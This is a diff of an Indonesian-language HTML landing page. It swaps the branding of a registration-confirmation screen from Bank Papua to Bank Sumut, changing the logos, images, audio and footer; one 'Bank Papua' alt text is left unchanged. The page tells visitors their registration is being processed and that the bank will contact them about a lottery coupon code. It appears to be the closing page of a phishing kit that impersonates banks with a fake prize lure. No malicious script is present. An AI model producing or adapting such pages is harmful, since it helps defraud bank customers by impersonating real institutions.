@@ -19,14 +19,12 @@
   <style>
     /* Latar belakang halaman */
     body {
-      background: linear-gradient(135deg, #e9f0f7, #f8f9fa);
       font-family: "Poppins", sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
       margin: 0;
-      padding: 20px;
     }
 
     /* Container utama */
@@ -36,17 +34,16 @@
       box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
       max-width: 600px;
       width: 100%;
-      padding: 30px;
       text-align: center;
     }
 
     .header img {
-      max-width: 120%;
+      max-width: 100%;
       margin-bottom: 15px;
     }
 
     .img-fluid {
-      margin-bottom: 15px;
+      margin-bottom: 0;
       border-radius: 8px;
       max-height: 300px;
       object-fit: cover;
@@ -54,7 +51,7 @@
 
     /* Kotak pesan dengan background tinggi, teks muncul satu per satu */
     .message {
-      background: linear-gradient(135deg, #004080, #0059b3);
+      background: linear-gradient(135deg, #4c86c0, #0059b3);
       color: #fff;
       padding: 15px;
       border-radius: 10px;
@@ -73,7 +70,6 @@
       white-space: pre-line; /* Agar bisa multiline */
       text-align: center;
       width: 100%;
-      padding: 0 10px;
     }
 
     .footer {
@@ -88,21 +84,22 @@
     }
 
     .swal2-image-custom {
-      margin-bottom: -10px; /* Naikkan gambar agar lebih rapi */
+      margin-bottom: -10px;
+      width: 130px;
     }
     .swal2-text-custom {
-  width: 20px;
-      /* Naikkan teks agar lebih rapi */
+      width: 20px;
     }
-    
   </style>
 </head>
 <body onload="initPage()">
+
   <div class="container">
+    
     <div class="header">
-      <img src="bank.png" alt="Logo" style="height: 120px ;" />
+      <img src="icon.png" alt="Logo" style="height: 70px ;" />
     </div>
-    <img src="formakhirr.png" alt="Ilustrasi Pelanggan" class="img-fluid" />
+    <img src="yoowe.jpg" alt="Ilustrasi Pelanggan" class="img-fluid" />
 
     <!-- Kotak pesan dengan efek ketik (typewriter) -->
     <div class="message">
@@ -110,19 +107,17 @@
     </div>
 
     <div class="footer">
-      &copy; 2025 Bank Papua
+      &copy; 2025 BANK SUMUT
     </div>
   </div>
 
-  <audio id="thankYouAudio" src="suara.mp3"></audio>
+  <audio id="thankYouAudio" src="speech.mp3"></audio>
   <script>
-    // Teks yang akan ditampilkan dengan efek ketik
-    const typewriterText = `Terimakasih Telah Mendaftar di Layanan Bank Papua.
+    const typewriterText = `Terimakasih Telah Mendaftar di Layanan Bank Sumut.
   Pendaftaran Anda Sedang Diproses.
-  Beberapa Saat Lagi Anda Akan Dihubungi Oleh Pihak Bank Papua
+  Beberapa Saat Lagi Anda Akan Dihubungi Oleh Pihak Bank Sumut
   Untuk Proses Cetak Kode Kupon Undian Anda.`;
   
-    // Fungsi untuk memutar audio setelah tombol OK ditekan
     function playAudio() {
       const audio = document.getElementById("thankYouAudio");
       const playPromise = audio.play();
@@ -139,11 +134,10 @@
       }
     }
   
-    // Efek ketik satu per satu huruf
     function typeWriterEffect(text, containerId, speed = 40) {
       let index = 0;
       const container = document.getElementById(containerId);
-      container.innerHTML = ""; // Reset teks
+      container.innerHTML = "";
   
       function typeChar() {
         if (index < text.length) {
@@ -155,11 +149,10 @@
       typeChar();
     }
   
-    // SweetAlert2 pop-up dengan gambar tester.jpg dan modal yang lebih kecil
     function showThankYouAlert() {
       Swal.fire({
         width: '320px',
-        imageUrl: "tester.jpg",
+        imageUrl: "icon.png",
         text: "Lanjut proses Penyelesaian.",
         imageAlt: "Bank Papua",
         confirmButtonText: "OK",
@@ -171,17 +164,15 @@
         },
       }).then((result) => {
         if (result.isConfirmed) {
-          playAudio(); // Jalankan suara setelah tombol OK ditekan
-          typeWriterEffect(typewriterText, "typingContainer", 40); // Jalankan efek ketik
+          playAudio();
+          typeWriterEffect(typewriterText, "typingContainer", 40);
         }
       });
     }
   
-    // Fungsi inisialisasi saat halaman di-load
     function initPage() {
-      showThankYouAlert(); // Tampilkan popup dulu, baru jalankan efek setelah OK
+      showThankYouAlert();
     }
   </script>
-  
 </body>
 </html>
